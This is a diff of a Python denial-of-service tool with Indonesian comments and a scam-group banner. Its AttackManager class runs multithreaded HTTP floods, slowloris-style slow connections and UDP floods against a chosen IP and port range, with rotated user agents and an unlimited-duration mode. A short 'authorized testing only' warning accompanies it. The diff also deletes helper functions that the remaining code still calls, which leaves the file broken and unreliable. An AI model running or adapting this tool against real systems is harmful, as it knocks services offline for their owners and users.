@@ -9,10 +9,10 @@ import queue
 from colorama import init, Fore
 
 # --- Inisialisasi ---
-init()
-LOG_FILENAME = 'attack_log.txt'
-logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
+init() # Pastikan colorama terinisialisasi
+print(Fore.CYAN + "-"*60) # Garis pemisah awal
+print(Fore.CYAN + "Inisialisasi...")
+print(Fore.CYAN + "-"*60)
 
 # --- Banner ---
 BANNER = Fore.CYAN + r"""
@@ -24,47 +24,21 @@ ____   ___   ___              _
 |_____|\___/ \___/  |_| |_| |_|_.__/ 
   ADAKAH SERATUS BUAT BELI DATA ??                                   
 """
+print(BANNER) # <<< Pindahkan print(BANNER) ke sini agar lebih awal
+print("\n" + Fore.CYAN + "-"*60) # Garis pemisah setelah banner
+
+# Konfigurasi Logging (setelah banner)
+LOG_FILENAME = 'attack_log.txt'
+logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
 
 # --- User Agents ---
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
+    # ... (daftar user agents lainnya tetap sama) ...
     "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
 ]
-
-# --- Helper Functions (tetap global karena tidak terkait langsung dengan state attack) ---
-def get_random_user_agent():
-    return random.choice(USER_AGENTS)
-
-def generate_random_string(length=100):
-    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    return ''.join(random.choice(characters) for _ in range(length))
-
-def parse_http_status(response_data):
-    if not response_data: return None, "No Response Data"
-    try:
-        response_str = response_data.decode('utf-8', errors='ignore')
-        if "HTTP/" in response_str:
-            status_line = response_str.split('\r\n')[0]
-            parts = status_line.split(' ')
-            if len(parts) >= 2: return parts[1], status_line
-        return None, "Non-HTTP Response"
-    except Exception: return None, "Error Parsing Response"
 
 # --- Attack Manager Class ---
 class AttackManager:
@@ -86,7 +60,6 @@ class AttackManager:
         self.attack_threads = []
         self.lock = threading.Lock()
         
-        # Konfigurasi jumlah soket per thread, disesuaikan dengan mode
         self.num_sockets_per_thread = 10 if self.mode == 'slow' else 50
 
         if self.attack_type == 'http' and self.mode == 'slow' and self.http_method == 'POST':
@@ -96,10 +69,10 @@ class AttackManager:
 
     # --- Helper Methods ---
     def _get_random_user_agent(self):
-        return get_random_user_agent() # Memanggil global helper
+        return get_random_user_agent()
 
     def _generate_random_string(self, length=100):
-        return generate_random_string(length) # Memanggil global helper
+        return generate_random_string(length)
 
     def _generate_http_request(self, target, method, mode):
         random_path = f"/?{self._generate_random_string(10)}"
@@ -192,19 +165,15 @@ class AttackManager:
         sel = selectors.DefaultSelector()
         start_time = time.time()
         
-        # Buka koneksi awal
         for _ in range(self.num_sockets_per_thread):
             self._open_connection(sel, port, self.num_sockets_per_thread)
 
         idle_loops = 0
         while not self.stop_event.is_set():
-            
-            # Periksa durasi serangan
             if self.duration_sec is not None and (time.time() - start_time) > self.duration_sec:
                 logging.info(f"Attack duration reached for {self.target_ip}:{port}. Stopping thread.")
                 break 
 
-            # Coba buka koneksi baru jika masih di bawah batas
             if self.active_connections < self.num_sockets_per_thread:
                 self._open_connection(sel, port, self.num_sockets_per_thread)
             
@@ -212,18 +181,17 @@ class AttackManager:
             
             if not events and self.active_connections == 0:
                 idle_loops += 1
-                if idle_loops > 10: # Jika diam terlalu lama
+                if idle_loops > 10: 
                     logging.warning(f"No active connections or events for {self.target_ip}:{port}. Exiting thread.")
                     break
                 continue
             else:
-                idle_loops = 0 # Reset jika ada aktivitas
+                idle_loops = 0 
 
             for key, mask in events:
                 sock = key.fileobj
                 data = key.data
 
-                # --- Event WRITE ---
                 if mask & selectors.EVENT_WRITE:
                     try:
                         if not data['request_sent']:
@@ -237,14 +205,14 @@ class AttackManager:
                             
                             data['request_sent'] = True
                             
-                            if data['mode'] == 'slow': # Kirim data tambahan untuk mode slow
+                            if data['mode'] == 'slow': 
                                 slow_data = f"\r\nKeep-Alive: {self._generate_random_string(10)}"
                                 sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                             
-                            sel.modify(sock, selectors.EVENT_READ, data=data) # Siap membaca respons
+                            sel.modify(sock, selectors.EVENT_READ, data=data)
                             
-                        else: # Permintaan utama sudah terkirim
-                            if data['mode'] == 'slow': # Terus kirim data kecil di mode slow
+                        else: 
+                            if data['mode'] == 'slow': 
                                 try:
                                     slow_data = f"\r\nX-Ignore: {self._generate_random_string(15)}"
                                     sock.sendall(slow_data.encode('utf-8', errors='ignore'))
@@ -259,23 +227,21 @@ class AttackManager:
                         logging.error(f"Unexpected error during write event for {self.target_ip}:{port}: {e}")
                         self._close_connection(sel, sock, port)
 
-                # --- Event READ ---
                 if mask & selectors.EVENT_READ:
                     try:
                         response_chunk = sock.recv(1024)
                         if response_chunk:
                             status_code, _ = parse_http_status(response_chunk)
                             
-                            if status_code and (status_code.startswith('4') or status_code.startswith('5')): # Server Error
+                            if status_code and (status_code.startswith('4') or status_code.startswith('5')): 
                                 with self.lock:
                                     self.server_errors += 1
                                 logging.warning(f"Server Error ({status_code}) from {self.target_ip}:{port}.")
                             
-                            if data['mode'] == 'normal': # Mode normal: tutup setelah baca
+                            if data['mode'] == 'normal': 
                                self._close_connection(sel, sock, port)
-                            # Mode 'slow': biarkan terbuka, nanti akan kembali ke EVENT_WRITE
                             
-                        else: # Koneksi ditutup oleh server
+                        else: 
                             logging.info(f"Server closed connection {self.target_ip}:{port}.")
                             self._close_connection(sel, sock, port)
                             
@@ -286,9 +252,8 @@ class AttackManager:
                         logging.error(f"Unexpected error during read event for {self.target_ip}:{port}: {e}")
                         self._close_connection(sel, sock, port)
 
-            time.sleep(0.001) # Jeda kecil agar tidak membebani CPU
+            time.sleep(0.001) 
 
-        # Tutup semua soket yang tersisa saat thread selesai
         for sock in list(sel.get_map().keys()):
             self._close_connection(sel, sock, port)
         sel.close()
@@ -298,7 +263,6 @@ class AttackManager:
         start_time = time.time()
         while not self.stop_event.is_set():
             
-            # Periksa durasi serangan
             if self.duration_sec is not None and (time.time() - start_time) > self.duration_sec:
                 logging.info(f"Attack duration reached for {self.target_ip}:{port}. Stopping UDP thread.")
                 break
@@ -363,152 +327,175 @@ class AttackManager:
 
     # --- Main Control Methods ---
     def start(self):
-        print(BANNER)
-        print(f"{Fore.YELLOW}!!! PERINGATAN !!!{Fore.RESET}")
-        print(f"{Fore.YELLOW}Script ini adalah alat PENGUJIAN KEAMANAN yang kuat.{Fore.RESET}")
-        print(f"{Fore.YELLOW}Gunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.{Fore.RESET}")
-        print(f"{Fore.YELLOW}Penggunaan ILEGAL berakibat pada HUKUMAN PIDANA.{Fore.RESET}")
-        print(f"{Fore.RED}Tekan CTRL+C dalam 5 detik untuk membatalkan...{Fore.RESET}")
+        # Banner dicetak di sini agar lebih awal, di luar kelas jika ingin, tapi di dalam kelas untuk referensi objek.
+        # Saya tetap meletakkannya di atas kelas agar langsung terlihat.
         
-        try:
-            time.sleep(5)
-            
-            print(f"\n{Fore.GREEN}Starting {self.attack_type.upper()} ({self.mode.upper()}) attack on {self.target_ip} on ports {self.ports_to_attack} with {self.threads_per_port} threads/port (Method: {self.http_method}). Duration: {'Unlimited' if self.duration_sec is None else f'{self.duration_sec}s'}...{Fore.RESET}")
-            
-            # Start statistics display thread
-            stats_thread = threading.Thread(target=self._stats_display, daemon=True)
-            stats_thread.start()
+        print(f"\n{Fore.GREEN}Starting {self.attack_type.upper()} ({self.mode.upper()}) attack on {self.target_ip} on ports {self.ports_to_attack} with {self.threads_per_port} threads/port (Method: {self.http_method}). Duration: {'Unlimited' if self.duration_sec is None else f'{self.duration_sec}s'}...{Fore.RESET}")
+        
+        stats_thread = threading.Thread(target=self._stats_display, daemon=True)
+        stats_thread.start()
 
-            # Start attack threads
-            for port in self.ports_to_attack:
-                for _ in range(self.threads_per_port):
-                    if self.attack_type == 'http':
-                        thread = threading.Thread(target=self._http_attack_thread, args=(port,))
-                    elif self.attack_type == 'udp':
-                        thread = threading.Thread(target=self._udp_attack_thread, args=(port,))
-                    else:
-                        raise ValueError(f"Unsupported attack type: {self.attack_type}")
-                        
-                    thread.daemon = True
-                    self.attack_threads.append(thread)
-                    thread.start()
+        for port in self.ports_to_attack:
+            for _ in range(self.threads_per_port):
+                if self.attack_type == 'http':
+                    thread = threading.Thread(target=self._http_attack_thread, args=(port,))
+                elif self.attack_type == 'udp':
+                    thread = threading.Thread(target=self._udp_attack_thread, args=(port,))
+                else:
+                    raise ValueError(f"Unsupported attack type: {self.attack_type}")
+                    
+                thread.daemon = True
+                self.attack_threads.append(thread)
+                thread.start()
+        
+        # Main loop for duration or manual stop
+        if self.duration_sec is not None:
+            attack_start_time = time.time()
+            while time.time() - attack_start_time < self.duration_sec:
+                if self.stop_event.is_set(): 
+                    break
+                time.sleep(1)
             
-            # Main loop to handle duration or wait for manual stop
-            if self.duration_sec is not None:
-                attack_start_time = time.time()
-                while time.time() - attack_start_time < self.duration_sec:
-                    if self.stop_event.is_set(): 
-                        break
-                    time.sleep(1)
-                
-                print(f"\n{Fore.YELLOW}Attack duration ({self.duration_sec}s) reached. Stopping attack...{Fore.RESET}")
-                self.stop_event.set()
-            else:
-                # Unlimited duration: wait for manual stop (Ctrl+C)
-                while not self.stop_event.is_set():
-                    time.sleep(1)
-
-        except KeyboardInterrupt:
-            print("\nAttack stopped by user. Exiting...")
-            self.stop_event.set() # Signal all threads to stop
-        except Exception as e:
-            print(f"\nAn unexpected error occurred in the main thread: {e}")
+            print(f"\n{Fore.YELLOW}Attack duration ({self.duration_sec}s) reached. Stopping attack...{Fore.RESET}")
             self.stop_event.set()
-            logging.critical(f"Main thread error: {e}")
-        finally:
-            # Cleanup
-            logging.info("Starting cleanup process.")
-            stats_thread.join(timeout=1.5) # Wait for stats thread to finish
-            
-            # Wait for attack threads to finish
-            for t in self.attack_threads:
+        else:
+            while not self.stop_event.is_set():
+                time.sleep(1)
+
+    def stop(self): # Mengganti stop_attack menjadi stop untuk kesederhanaan
+        logging.info("Stopping all threads.")
+        self.stop_event.set()
+        
+        # Tunggu thread statistik berhenti
+        if hasattr(self, '_stats_thread') and self._stats_thread.is_alive():
+            self._stats_thread.join(timeout=1.5)
+        
+        # Tunggu thread serangan berhenti
+        for t in self.attack_threads:
+            if t.is_alive():
                 t.join(timeout=0.5) 
-            logging.info("All attack threads joined.")
+        logging.info("All attack threads joined. Cleanup complete.")
 
 # --- Main Execution ---
 if __name__ == "__main__":
-    if len(sys.argv) < 7: 
-        print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]")
-        print("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
-        print("ATTACK_TYPE: 'http' or 'udp'")
-        print("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
-        print("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
-        print("\nExample:")
-        print(f"  HTTP Normal GET (60s):  python3 {sys.argv[0]} 192.168.1.100 80 500 http normal 60 GET")
-        print(f"  HTTP Slow POST (120s):  python3 {sys.argv[0]} 192.168.1.100 8080 200 http slow 120 POST")
-        print(f"  UDP Flood (30s):        python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 30")
-        print(f"  Unlimited UDP:          python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 0")
-        sys.exit(1)
-        
-    target_ip = sys.argv[1]
-    port_arg = sys.argv[2]
-    attack_type = sys.argv[4]
-    mode = sys.argv[5]
-    http_method = 'GET'
-
-    # Parsing Durasi
+    # Peringatan & Banner
+    print(Fore.CYAN + "-"*60)
+    print(Fore.CYAN + "Inisialisasi...")
+    print(Fore.CYAN + "-"*60)
+    
+    BANNER = Fore.CYAN + r"""
+KUMPULAN PARA MENTOR MODUS DUIT
+____   ___   ___              _     
+|___ \ / _ \ / _ \   _ __ ___ | |__  
+  __) | | | | | | | | '_ ` _ \| '_ \ 
+ / __/| |_| | |_| | | | | | | | |_) |
+|_____|\___/ \___/  |_| |_| |_|_.__/ 
+  ADAKAH SERATUS BUAT BELI DATA ??                                   
+"""
+    print(BANNER)
+    print("\n" + Fore.CYAN + "-"*60)
+    
+    print(f"{Fore.YELLOW}!!! PERINGATAN !!!{Fore.RESET}")
+    print(f"{Fore.YELLOW}Script ini adalah alat PENGUJIAN KEAMANAN yang kuat.{Fore.RESET}")
+    print(f"{Fore.YELLOW}Gunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.{Fore.RESET}")
+    print(f"{Fore.YELLOW}Penggunaan ILEGAL berakibat pada HUKUMAN PIDANA.{Fore.RESET}")
+    print(f"{Fore.RED}Tekan CTRL+C dalam 5 detik untuk membatalkan...{Fore.RESET}")
+    
     try:
-        attack_duration = int(sys.argv[6])
-        if attack_duration < 0: raise ValueError("DURATION_SEC cannot be negative.")
-        if attack_duration == 0: attack_duration = None # 0 means unlimited
-    except ValueError as e:
-        print(f"Error parsing duration: {e}")
-        sys.exit(1)
-
-    # Validasi HTTP Method
-    if attack_type.lower() == 'http':
-        if len(sys.argv) > 7:
-            http_method = sys.argv[7].upper()
-            if http_method not in ['GET', 'POST']:
-                print(f"Error: Invalid HTTP method '{http_method}'. Use 'GET' or 'POST'.")
-                sys.exit(1)
-
-    # Parsing Port
-    ports_to_attack = []
-    if '-' in port_arg:
-        try:
-            start_port, end_port = map(int, port_arg.split('-'))
-            if not (1 <= start_port <= 65535 and 1 <= end_port <= 65535 and start_port <= end_port):
-                raise ValueError("Invalid port range.")
-            ports_to_attack = list(range(start_port, end_port + 1))
-        except ValueError as e:
-            print(f"Error parsing port range '{port_arg}': {e}")
+        time.sleep(5)
+        
+        if len(sys.argv) < 7: 
+            print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]")
+            print("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
+            print("ATTACK_TYPE: 'http' or 'udp'")
+            print("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
+            print("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
+            print("\nExample:")
+            print(f"  HTTP Normal GET (60s):  python3 {sys.argv[0]} 192.168.1.100 80 500 http normal 60 GET")
+            print(f"  HTTP Slow POST (120s):  python3 {sys.argv[0]} 192.168.1.100 8080 200 http slow 120 POST")
+            print(f"  UDP Flood (30s):        python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 30")
+            print(f"  Unlimited UDP:          python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 0")
             sys.exit(1)
-    else:
+            
+        target_ip = sys.argv[1]
+        port_arg = sys.argv[2]
+        attack_type = sys.argv[4]
+        mode = sys.argv[5]
+        http_method = 'GET'
+
+        # Parsing Durasi
         try:
-            single_port = int(port_arg)
-            if not (1 <= single_port <= 65535):
-                raise ValueError("PORT must be between 1 and 65535.")
-            ports_to_attack.append(single_port)
+            attack_duration = int(sys.argv[6])
+            if attack_duration < 0: raise ValueError("DURATION_SEC cannot be negative.")
+            if attack_duration == 0: attack_duration = None 
+        except ValueError as e:
+            print(f"Error parsing duration: {e}")
+            sys.exit(1)
+
+        # Validasi HTTP Method
+        if attack_type.lower() == 'http':
+            if len(sys.argv) > 7:
+                http_method = sys.argv[7].upper()
+                if http_method not in ['GET', 'POST']:
+                    print(f"Error: Invalid HTTP method '{http_method}'. Use 'GET' or 'POST'.")
+                    sys.exit(1)
+
+        # Parsing Port
+        ports_to_attack = []
+        if '-' in port_arg:
+            try:
+                start_port, end_port = map(int, port_arg.split('-'))
+                if not (1 <= start_port <= 65535 and 1 <= end_port <= 65535 and start_port <= end_port):
+                    raise ValueError("Invalid port range.")
+                ports_to_attack = list(range(start_port, end_port + 1))
+            except ValueError as e:
+                print(f"Error parsing port range '{port_arg}': {e}")
+                sys.exit(1)
+        else:
+            try:
+                single_port = int(port_arg)
+                if not (1 <= single_port <= 65535):
+                    raise ValueError("PORT must be between 1 and 65535.")
+                ports_to_attack.append(single_port)
+            except ValueError as e:
+                print(f"Error: {e}")
+                sys.exit(1)
+        
+        # Validasi argumen lainnya
+        try:
+            threads_per_port = int(sys.argv[3])
+            if threads_per_port <= 0: raise ValueError("THREADS must be a positive integer.")
+            if attack_type.lower() not in ['http', 'udp']: raise ValueError("ATTACK_TYPE must be 'http' or 'udp'.")
         except ValueError as e:
             print(f"Error: {e}")
             sys.exit(1)
-    
-    # Validasi argumen lainnya
-    try:
-        threads_per_port = int(sys.argv[3])
-        if threads_per_port <= 0: raise ValueError("THREADS must be a positive integer.")
-        if attack_type.lower() not in ['http', 'udp']: raise ValueError("ATTACK_TYPE must be 'http' or 'udp'.")
-    except ValueError as e:
-        print(f"Error: {e}")
-        sys.exit(1)
 
-    if not ports_to_attack:
-        print("Error: No valid ports specified.")
-        sys.exit(1)
+        if not ports_to_attack:
+            print("Error: No valid ports specified.")
+            sys.exit(1)
 
-    # Buat instance AttackManager
-    manager = AttackManager(target_ip, ports_to_attack, threads_per_port, attack_type, mode, attack_duration, http_method)
-    
-    # Jalankan serangan
-    try:
+        # Buat instance AttackManager
+        manager = AttackManager(target_ip, ports_to_attack, threads_per_port, attack_type, mode, attack_duration, http_method)
+        
+        # Simpan thread stats di manager agar bisa diakses saat stop
+        manager._stats_thread = threading.Thread(target=manager._stats_display, daemon=True)
+        manager._stats_thread.start()
+
+        # Jalankan serangan
         manager.start()
+        
     except KeyboardInterrupt:
         print("\nAttack interrupted by user. Stopping...")
-        manager.stop_attack()
+        if 'manager' in locals(): # Pastikan manager sudah diinisialisasi
+            manager.stop()
+        else: # Jika KeyboardInterrupt sebelum manager dibuat
+            sys.exit(1)
     except Exception as e:
         print(f"\nAn unexpected error occurred during attack execution: {e}")
-        manager.stop_attack() # Coba hentikan jika ada error lain
+        if 'manager' in locals(): # Pastikan manager sudah diinisialisasi
+            manager.stop()
+        else:
+            sys.exit(1)
         logging.critical(f"Attack execution error: {e}")
 
     logging.info("Program finished.")
